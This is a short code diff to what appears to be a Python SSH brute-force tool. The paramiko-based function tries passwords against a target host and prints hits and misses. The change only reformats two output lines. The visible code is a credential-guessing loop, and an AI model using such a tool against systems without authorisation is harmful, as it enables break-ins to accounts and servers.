@@ -23,11 +23,11 @@ def ssh_brute_force(target_ip, username, password_file):
             ssh = paramiko.SSHClient()
             ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy ())
             ssh.connect(hostname=target_ip,username=username, password=password,timeout=timeout)
-            print(f"{tally} [+] Success! Username: {username} | Password:{password}")
+            print(f"{tally} [+] Success! Username: {username} | Password: {password}")
             ssh.close()
             return
         except paramiko.AuthenticationException:
-            print(f"{tally} [-] Failed:{password}")
+            print(f"{tally} [-] Failed: {password}")
         except (socket.error, paramiko.SSHException) as e:
             print(f"[!] Connection error:{str(e)}")
             time.sleep (2)
